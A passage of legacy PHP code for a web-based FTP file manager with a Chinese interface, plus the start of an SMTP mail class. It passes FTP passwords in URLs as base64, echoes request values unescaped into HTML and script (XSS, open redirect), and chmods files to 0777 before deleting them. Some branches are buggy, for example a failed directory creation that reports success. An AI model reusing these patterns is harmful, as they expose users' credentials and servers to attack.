                        $systype = ftp_systype($conn_id);// "UNIX";//
                        foreach ($contents as $current){ 
                                if ($systype == "Windows_NT"){
                                        ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                        for($i = 0;$i < count($contents);$i++){
                                                if ($_POST["chidd".$i] == $split[8]){
                                                        if ($split[7]=="<DIR>"){
                                                                $msg = ftp_deldir($conn_id,trim(request("dir"))."/".$_POST["chidd".$i]);
                                                        }
                                                        else{   
                                                                $msg = @ftp_delete($conn_id,trim(request("dir"))."/".$_POST["chidd".$i]);
                                                        }
                                                        $delcount = $delcount + 1;
                                                        break;
                                                }
                                        }
                                        if ($msg == true || $msg == "wait"){
                                                unset($current);
                                                unset($split);
                                        }
                                        elseif ($msg == false){
                                                unset($current);
                                                unset($split);
                                                break;
                                        }
                                }
                                elseif ($systype == "UNIX"){
                                        ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                        for($i = 0;$i < count($contents);$i++){
                                                if ($_POST["chidd".$i] == $split[8]){
                                                        if (substr($split[1],0,1)=="d"){
                                                                $msg = ftp_deldir($conn_id,trim(request("dir"))."/".$_POST["chidd".$i]);
                                                        }       
                                                        else{   
                                                                $msg = @ftp_delete($conn_id,trim(request("dir"))."/".$_POST["chidd".$i]);
                                                        }       
                                                        $delcount = $delcount + 1;
                                                        break;
                                                }
                                        }
                                        if ($msg == true || $msg == "wait"){
                                                unset($current);
                                                unset($split);
                                        }
                                        elseif ($msg == false){
                                                unset($current);
                                                unset($split);
                                                break;
                                        }
                                }
                        }
                }
                if ($msg == true){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        <?php 
                        if (trim(request("type")) != ""){
                        ?>
                                <?php if (trim(request("type")) == "file"){?>文件<?php }?><?php if (trim(request("type")) == "dir"){?>目录<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> 删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                        <?php 
                        }
                        elseif (trim(request("type")) == ""){
                        ?>
                                <?php echo $delcount;?> 个文件或目录删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                        <?php 
                        }
                        ?>
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       
                elseif ($msg == false){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php 
                if (trim(request("type")) != ""){
                ?>
                        <?php if (trim(request("type")) == "file"){?>文件<?php }?><?php if (trim(request("type")) == "dir"){?>目录<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> 删除失败！<?php  echo $timeout/1000?> 秒后返回上一页
                <?php 
                }
                elseif (trim(request("type")) == ""){
                ?>
                        文件或目录删除失败！<?php  echo $timeout/1000?> 秒后返回上一页
                <?php 
                }
                ?>              
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       
                elseif ($msg == "wait"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php 
                if (trim(request("type")) != ""){
                ?>
                        <?php if (trim(request("type")) == "file"){?>文件<?php }?><?php if (trim(request("type")) == "dir"){?>目录<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> 删除未成功！<?php  echo $timeout/1000?> 秒后返回上一页
                <?php 
                }
                elseif (trim(request("type")) == ""){
                ?>
                        文件或目录删除未成功！<?php  echo $timeout/1000?> 秒后返回上一页
                <?php 
                }
                ?>              
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       
                break;
        case "ftp.rename":
                $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                if ((!$conn_id) || (!$login_result)) {
                    AlertBack("FTP登陆失败！" , 1);
                }
                $contents = ftp_rawlist($conn_id, "/");
                //print_r($contents);
                if (ftp_systype($conn_id) == "Windows_NT"){
                        foreach ($contents as $current){ 
                                ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if (trim(request("to")) == $split[8]){
                                        AlertBack("已经存在该文件或目录名！" , 1);
                                        break;
                                        return; 
                                }
                                unset($current);
                                unset($split);
                        }
                }
                elseif (ftp_systype($conn_id) == "UNIX"){
                        foreach ($contents as $current){ 
                                ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                if (trim(request("to")) == $split[8]){
                                        AlertBack("已经存在该文件或目录名！" , 1);
                                        break;
                                        return; 
                                }
                                unset($current);
                                unset($split);
                        }
                }
                ftp_chdir ($conn_id,"/");
                $msg = ftp_rename($conn_id,trim(request("dir"))."/".trim(request("from")),trim(request("dir"))."/".trim(request("to")));
                if ($msg == true){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                文件或目录重命名成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       
                elseif ($msg == false){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                文件或目录重命名失败！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       

                break;  
        case "ftp.new":
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">&nbsp;FTP管理 -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;"><?php echo trim(request("dir"));?></a></td>
        </tr>
</table>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form enctype="multipart/form-data" action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor."&server=".encodeuri(trim(request("server")))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&port=".trim(request("port"));?>&action=<?php echo encodeuri("ftp.create");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>&refer=<?php echo encodeuri(trim(request("refer")));?>" method="POST" name="ftp">
                        &nbsp名称：<input type="text" class="text" name="name" value="" style="height:20px;width:15%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        目录<input type="radio" name="type" value="dir" checked>
                        <noscript>
                        文件<input type="radio" name="type" value="file" >
                        </noscript>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>                
                <?php 
                break;  
        case "ftp.create":
                if (trim(request("name")) == ""){
                        if (trim($_POST["name"]) == ""){
                                AlertBack("文件或目录名为空" , 1);
                                break;
                        }
                        else{
                                AlertBack("文件或目录名为空！" , 2);
                                break;
                        }
                }
                If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }               
                }  
                elseif (trim($_POST["name"]) != ""){
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&name=".encodeuri(trim(request("name")))."&type=".encodeuri(trim(request("type")))."&refer=".encodeuri(trim(request("refer"))));
                        break;
                }
                $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                if ((!$conn_id) || (!$login_result)) {
                    AlertBack("FTP登陆失败！" , 1);
                }
                if (trim(request("type")) == "dir"){
                        $msg = @ftp_mkdir($conn_id,trim(request("dir"))."/".trim(request("name")));
                        if ($msg == trim(request("dir"))."/".trim(request("name"))){
                                $msg = true;
                        }
                }
                $timeout = "5000";
                if ($msg == true) {// check upload status
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php 
                if (trim(request("type")) == "dir"){
                ?>
                        目录 <?php echo trim(request("name"));?> 创建成功！<?php  echo $timeout/1000?> 秒后返回上一页   
                <?php                       
                }
                elseif (trim(request("type")) == "dir"){
                ?>
                        文件 <?php echo trim(request("name"));?> 创建成功！<?php  echo $timeout/1000?> 秒后返回上一页   
                <?php                       
                }
                ?>
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                elseif($msg == false){// check upload status
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php 
                if (trim(request("type")) == "dir"){
                ?>
                        目录 <?php echo trim(request("name"));?> 创建成功！<?php  echo $timeout/1000?> 秒后返回上一页   
                <?php                       
                }
                elseif (trim(request("type")) == "dir"){
                ?>
                        文件 <?php echo trim(request("name"));?> 创建成功！<?php  echo $timeout/1000?> 秒后返回上一页   
                <?php                       
                }
                ?>
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }       
                break;          
        case "ftp.upload":
                //$pathdir = trim(request("dir"))==""?"/":trim(request("dir"));
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">&nbsp;FTP管理 -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".trim(request("dir"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&dir=".encodeuri("/")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("dir"));?></td>
        </tr>
</table>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form enctype="multipart/form-data" action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor."&server=".encodeuri(trim(request("server")))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&port=".trim(request("port"));?>&action=<?php echo encodeuri("ftp.uploadfile");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>&refer=<?php echo encodeuri(trim(request("refer")));?>" method="POST" name="ftp">
                        &nbsp文件路径：<input type="file" class="text" name="filepath" value="" style="height:20px;width:25%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        二进制：<input type="checkbox" id="binary" name="binary" value="1" />
                        <input type="hidden" class="text" name="timestamp" value="<?php echo time();?>" size="1"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                        <?php  echo ' '.'文件上传限制：'.ini_get("upload_max_filesize"); ?>
                </td>
        </tr>   
</table>                
                <?php 
                break;          
        case "ftp.uploadfile":
                if ($_FILES['filepath']['tmp_name'] == "" || $_FILES['filepath']['name'] == ""){
                        AlertBack("文件路径名为空！" , 1);
                        break;
                }
                If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }               
                }               
                //$pathdir = trim(request("dir"))==""?"/":trim(request("dir"));
                $serverport = trim(request("port"))==""?"21":trim(request("port"));
                if (trim(request("ssl")) == "1"){
                        $conn_id = ftp_ssl_connect(base64_decode(trim(request("server"))),$serverport);
                }
                else{
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))),$serverport);
                }       
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                @ftp_chdir($conn_id, "/");

                ?>
                <div id="bar"></div>
                <?php 

                //move_uploaded_file(trim(request("tmpname")), ini_get("user_dir")."\\ftptmp\\".basename(trim(request("filename"))));
                //echo is_uploaded_file($_FILES['filepath']['tmp_name'])?"t":"f";
                if (trim(request("binary")) == "1")
                        $upload = @ftp_put($conn_id, trim(request("dir"))."/".$_FILES['filepath']['name'], $_FILES['filepath']['tmp_name'], FTP_BINARY);
                        //$upload = @ftp_nb_put($conn_id, trim(request("dir"))."/".$_FILES['filepath']['name'], $_FILES['filepath']['tmp_name'], FTP_BINARY);
                else
                        $upload = @ftp_put($conn_id, trim(request("dir"))."/".$_FILES['filepath']['name'], $_FILES['filepath']['tmp_name'], FTP_ASCII);
                        //$upload = @ftp_nb_put($conn_id, trim(request("dir"))."/".$_FILES['filepath']['name'], $_FILES['filepath']['tmp_name'], FTP_ASCII);
        
                $timeout = "5000";
                if ($upload == true) {// check upload status
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                文件上传成功！共用时： <?php echo (time()-trim(request('timestamp')))/60;?> 分钟 <?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                elseif($upload == false){// check upload status
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                文件上传失败！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }       
                
                break;          
        case "ftp.download":
                Header("Content-type:application/octet-stream",false);
                $ch = curl_init();
                $url = "ftp://".base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))."@".base64_decode(trim(request("server"))).trim(request("dir"))."/".trim(request("filename"));
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch); 
                print_r($xmlstr);               
                break;          
        case "ftp.view":
                $serverport = trim(request("port"))==""?"21":trim(request("port"));
                if (trim(request("ssl")) == "1"){
                        $conn_id = ftp_ssl_connect(base64_decode(trim(request("server"))),$serverport);
                }
                else{
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))),$serverport);
                }       
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                //@ftp_chdir($conn_id, "/");    
                $count = ftp_view($conn_id,((trim(request("dir"))=="/")?""."/":$dir."/").trim(request("dirname")),0,0);         
                if (((trim(request("dir"))=="/")?""."/":$dir."/").trim(request("dirname")) == arrmember(split("[|]",$count),"2")){
                        echo "目录:".arrmember(split("[|]",$count),"0").".文件:".arrmember(split("[|]",$count),"1")."\r\n";
                }
                break;          
        case "ftp.zip":
                break;          
        default:
								if ($_SESSION["ftp"]["server"] != "" && $_SESSION["ftp"]["uname"] != "" && $_SESSION["ftp"]["pwd"] != "" && trim(request("server")) == "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_SESSION["ftp"]["server"])))."&ssl=".encodeuri(trim($_SESSION["ftp"]["ssl"]))."&pasv=".encodeuri(trim($_SESSION["ftp"]["pasv"]))."&binary=".encodeuri(trim($_SESSION["ftp"]["binary"]))."&port=".encodeuri(trim($_SESSION["ftp"]["port"])).$skincolor."&dir=".encodeuri(trim($_SESSION["ftp"]["dir"]))."&uname=".encodeuri(base64_encode(trim($_SESSION["ftp"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["ftp"]["pwd"])))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }        
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("ftp.list");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>" method="post" name="ftp">
                        &nbsp域名：<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        &nbsp端口：<input type="port" class="text" name="port" value="" style="height:20px;width:4%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        SSL：<input type="checkbox" id="ssl" name="ssl" value="1" />
                        被动：<input type="checkbox" id="pasv" name="pasv" value="1" />
                        &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php                       
                                
                } //action switch end
                $style->footer();
                exit;                   
}

function ftp_view($conn_id,$dir,$dircount,$filecount){
        $contents = ftp_rawlist($conn_id, $dir);
        if (ftp_systype($conn_id) == "Windows_NT"){
                foreach ($contents as $current){ 
                        ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                        if ($split[7] == "<DIR>"){
                                echo ($dir=="/")?"":$dir;
                                echo "/".$split[8]."\r\n"; 
                                $dircount = $dircount + 1;                              
                                $count = ftp_view($conn_id,$dir."/".$split[8],$dircount,$filecount);
                                $dircount = (int)arrmember(split("[|]",$count),"0");
                                $filecount = (int)arrmember(split("[|]",$count),"1");
                        }
                        else{
                                $filecount = $filecount + 1;                            
                                echo ($dir=="/")?"":$dir;
                                echo "/".$split[8]."\r\n"; 
                        }
                }       
        }
        //echo "目录：".$dircount."文件".$filecount."\r\n";             
        return $dircount."|".$filecount."|".$dir;               
}

function ftp_deldir($conn_id,$dir){
        $contents = ftp_rawlist($conn_id, $dir);
        $msg = "wait";
        $systype = ftp_systype($conn_id);
        if(count($contents) != '0'){    
                foreach ($contents as $current){ 
                        if ($systype == "Windows_NT"){
                                ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if ($split[7]=="<DIR>"){
                                        if ($split[8] == "." || $split[8] == ".."){
                                        }
                                        else{                           
                                                ftp_chmod($conn_id, 0777, $dir.'/'.$split[8]);
                                                $msg = ftp_deldir($conn_id,$dir.'/'.$split[8]);
                                        }
                                }
                                else{   
                                        if ($split[8] == "." || $split[8] == ".."){
                                        }
                                        else{                                   
                                                ftp_chmod($conn_id, 0777, $dir.'/'.$split[8]);                          
                                                $msg = @ftp_delete($conn_id,$dir.'/'.$split[8]);
                                        }       
                                }
                                if ($msg == true || $msg == "wait"){
                                        unset($current);
                                        unset($split);
                                }
                                elseif ($msg == false){
                                        unset($current);
                                        unset($split);
                                        return false;
                                }
                        }
                        elseif ($systype == "UNIX"){
                                ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                if (substr($split[1],0,1)=="d"){
                                        if ($split[8] == "." || $split[8] == ".."){
                                        }
                                        else{                                   
                                                ftp_chmod($conn_id, 0777, $dir.'/'.$split[8]);                          
                                                $msg = ftp_deldir($conn_id,$dir.'/'.$split[8]);
                                        }       
                                }       
                                else{
                                        if ($split[8] == "." || $split[8] == ".."){
                                        }
                                        else{                                   
                                                ftp_chmod($conn_id, 0777, $dir.'/'.$split[8]);                          
                                                $msg = @ftp_delete($conn_id,$dir.'/'.$split[8]);
                                        }       
                                }       
                                if ($msg == true || $msg == "wait"){
                                        unset($current);
                                        unset($split);
                                }
                                else{
                                        unset($current);
                                        unset($split);
                                        return false;
                                }
                        }
                }
        }
        ftp_chmod($conn_id, 0777, $dir);        
        return @ftp_rmdir($conn_id,$dir);
}
?>

<?php  class smtp 
{
        
/* Public Variables */ 
var $smtp_port; 
var $time_out; 
var $host_name; 
var $log_file; 
var $relay_host; 
var $debug; 
var $auth; 
var $user; 
var $pass; 
var $timeout;
var $charset;

/* Private Variables */ 
var $sock; 

/* Constractor */ 
function smtp($relay_host = "", $smtp_port = 25,$auth = false,$user,$pass,$timeout=30) 
{ 
        $this->debug = FALSE; 
        $this->smtp_port = $smtp_port; 
        $this->relay_host = $relay_host; 
        $this->time_out = $timeout; 
        //is used in fsockopen() # 
        $this->auth = $auth;//auth 
        $this->user = $user; 
        $this->pass = $pass; 
        $this->host_name = "localhost"; 
        //is used in HELO command 
        $this->log_file = ""; 
        $this->sock = FALSE; 
        $this->charset = "utf-8"; 
} 
/* 
Main Function 
*/ 
function sendmail($to,$toname, $from,$fromname, $subject = "", $body = "", $mailtype="html", $cc = "", $bcc = "", $additional_headers = "") 
{
        date_default_timezone_set('UTC');
        $mail_from = $this->get_address($this->strip_comment($from)); 
        $body = ereg_replace("(^|(\r\n))(\.)", ".", $body); 
        $header  = '';
        $header .= "MIME-Version:1.0\r\n"; 
        if($mailtype=="html")
        {
                 $header .= "Content-Type:text/html\r\n"; 
        }
        else
        {
                 $header .= "Content-Type:text/plain\r\n"; 
        }        
        $header .= "To: $toname<".$to.">\r\n"; 
        //$header .= "To: =?$this->charset?B?".base64_encode($to_name)."?=<$to_mail>\r\n"
        if ($cc != "") 
        { 
                $header .= "Cc: ".$cc."\r\n"; 
        } 
        $header .= "From: $fromname<".$from.">\r\n"; 
        //$header .= "From: =?$this->charset?B?".base64_encode($from)."?=<$from>\r\n"
        $header .= "Subject: ".$subject."\r\n"; 
        $header .= $additional_headers; 
        $header .= "Date: ".date("r",time()+3600*8)."\r\n"; 
        $header .= "X-Mailer:By Redhat (PHP/".phpversion().")\r\n"; 
        list($msec, $sec) = explode(" ", microtime()); 
        $header .= "Message-ID: <".date("YmdHis", $sec+3600*8).".".($msec*1000000).".".$mail_from.">\r\n"; 

        $TO = explode(",", $this->strip_comment($to)); 
        if ($cc != "") 
        { 
                $TO = array_merge($TO, explode(",", $this->strip_comment($cc))); 
        } 
        if ($bcc != "") 
        { 
                $TO = array_merge($TO, explode(",", $this->strip_comment($bcc))); 
        } 
        $sent = TRUE; 
        foreach ($TO as $rcpt_to) 
        { 
                $rcpt_to = $this->get_address($rcpt_to); 
                if (!$this->smtp_sockopen($rcpt_to)) 
                { 
                        $this->log_write("Error: Cannot send email to ".$rcpt_to."\n"); 
                        $sent = FALSE; continue; 
                } 
                if ($this->smtp_send($this->host_name, $mail_from, $rcpt_to, $header, $body)) 
                { 
                        $this->log_write("E-mail has been sent to <".$rcpt_to.">\n"); 
                } 
                else 
                { 
                        $this->log_write("Error: Cannot send email to <".$rcpt_to.">\n"); 
                        $sent = FALSE; 
                } 
                fclose($this->sock); 
                $this->log_write("Disconnected from remote host\n"); 
        } 
        return $sent; 
} 
/* 
Private Functions 
*/ 
function smtp_send($helo, $from, $to, $header, $body = "") 
{
        if (!$this->smtp_putcmd("HELO", $helo)) 
        { 
                return $this->smtp_error("sending HELO command"); 
        } 
        #auth 
        if($this->auth)
        { 
                if (!$this->smtp_putcmd("AUTH LOGIN", base64_encode($this->user))) 
                { 
                        return $this->smtp_error("sending HELO command"); 
                } 
                if (!$this->smtp_putcmd("", base64_encode($this->pass))) 
                { 
                        return $this->smtp_error("sending HELO command"); 
                } 
        } 
        # 
